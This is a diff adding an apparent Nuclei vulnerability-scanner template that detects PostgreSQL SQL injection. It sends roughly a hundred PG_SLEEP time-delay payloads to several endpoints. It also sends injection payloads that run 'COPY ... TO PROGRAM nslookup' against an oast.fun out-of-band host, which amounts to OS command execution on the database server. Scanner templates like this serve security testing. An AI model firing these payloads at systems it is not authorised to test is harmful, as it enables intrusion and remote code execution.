@@ -1,0 +1,216 @@
+id: sql-injection-time-dns
+info:
+  name: Time-Based and DNS Exfiltration SQL Injection Detection
+  author: pwn
+  severity: critical
+  description: Detects Time-Based and DNS Exfiltration SQL Injection vulnerabilities in PostgreSQL databases using payloads that cause delays or trigger DNS lookups, potentially allowing data extraction or code execution.
+  tags: sqli, time-based, dns-exfiltration, postgresql, rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q={{payload}}"
+      - "{{BaseURL}}/id={{payload}}"
+      - "{{BaseURL}}/api?query={{payload}}"
+      - "{{BaseURL}}:8080/search?q={{payload}}"
+      - "{{BaseURL}}:8080/id={{payload}}"
+      - "{{BaseURL}}:8080/api?query={{payload}}"
+    payloads:
+      payload:
+        - ";PG_SLEEP(15)+-"
+        - ");PG_SLEEP(15)+-"
+        - "));PG_SLEEP(15)+-"
+        - ")));PG_SLEEP(15)+-"
+        - "';PG_SLEEP(15)+-"
+        - "');PG_SLEEP(15)+-"
+        - "'));PG_SLEEP(15)+-"
+        - "')));PG_SLEEP(15)+-"
+        - "\";PG_SLEEP(15)+-"
+        - "\");PG_SLEEP(15)+-"
+        - "\"));PG_SLEEP(15)+-"
+        - "\")));PG_SLEEP(15)+-"
+        - "`;PG_SLEEP(15)+-"
+        - "`);PG_SLEEP(15)+-"
+        - "`));PG_SLEEP(15)+-"
+        - "`)));PG_SLEEP(15)+-"
+        - ";SELECT+PG_SLEEP(15)+-"
+        - ");SELECT+PG_SLEEP(15)+-"
+        - "));SELECT+PG_SLEEP(15)+-"
+        - ")));SELECT+PG_SLEEP(15)+-"
+        - "';SELECT+PG_SLEEP(15)+-"
+        - "');SELECT+PG_SLEEP(15)+-"
+        - "'));SELECT+PG_SLEEP(15)+-"
+        - "')));SELECT+PG_SLEEP(15)+-"
+        - "\";SELECT+PG_SLEEP(15)+-"
+        - "\");SELECT+PG_SLEEP(15)+-"
+        - "\"));SELECT+PG_SLEEP(15)+-"
+        - "\")));SELECT+PG_SLEEP(15)+-"
+        - "`;SELECT+PG_SLEEP(15)+-"
+        - "`);SELECT+PG_SLEEP(15)+-"
+        - "`));SELECT+PG_SLEEP(15)+-"
+        - "`)));SELECT+PG_SLEEP(15)+-"
+        - "+UNION+SELECT+PG_SLEEP(15)+-"
+        - ")+UNION+SELECT+PG_SLEEP(15)+-"
+        - "))+UNION+SELECT+PG_SLEEP(15)+-"
+        - ")))+UNION+SELECT+PG_SLEEP(15)+-"
+        - "'+UNION+SELECT+PG_SLEEP(15)+-"
+        - "')+UNION+SELECT+PG_SLEEP(15)+-"
+        - "'))+UNION+SELECT+PG_SLEEP(15)+-"
+        - "')))+UNION+SELECT+PG_SLEEP(15)+-"
+        - "\"+UNION+SELECT+PG_SLEEP(15)+-"
+        - "\")+UNION+SELECT+PG_SLEEP(15)+-"
+        - "\"))+UNION+SELECT+PG_SLEEP(15)+-"
+        - "\")))+UNION+SELECT+PG_SLEEP(15)+-"
+        - "`+UNION+SELECT+PG_SLEEP(15)+-"
+        - "`)+UNION+SELECT+PG_SLEEP(15)+-"
+        - "`))+UNION+SELECT+PG_SLEEP(15)+-"
+        - "`)))+UNION+SELECT+PG_SLEEP(15)+-"
+        - ";(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - ");(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - ")));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "';(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "');(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "'));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "')));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "\";(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "\");(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "\"));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "\")));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "`;(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "`);(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "`));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "`)));(SELECT+1+FROM+PG_SLEEP(15))+-"
+        - "+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - ")+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - ")))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "'+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "')+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "'))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "')))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\"+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\")+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\"))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\")))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`)+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`)))+AND+123=(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - ")+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - ")))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "'+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "')+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "'))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "')))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\"+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\")+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\"))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\")))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`)+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`)))+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - ")+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - ")))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "'+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "')+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "'))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "')))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\"+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\")+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\"))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "\")))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`)+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+        - "`)))+UNION+SELECT+(CASE+WHEN+(1=1)+THEN+(SELECT+123+FROM+PG_SLEEP(15))+ELSE+1337+END)+-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>=15"
+        condition: and
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q={{payload}}"
+      - "{{BaseURL}}/id={{payload}}"
+      - "{{BaseURL}}/api?query={{payload}}"
+      - "{{BaseURL}}:8080/search?q={{payload}}"
+      - "{{BaseURL}}:8080/id={{payload}}"
+      - "{{BaseURL}}:8080/api?query={{payload}}"
+    payloads:
+      payload:
+        - ";COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - ");COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - ")));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "';COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "');COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "'));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "')));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "\";COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "\");COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "\"));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "\")));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "`;COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "`);COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "`));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
+        - "`)));COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun'+-"
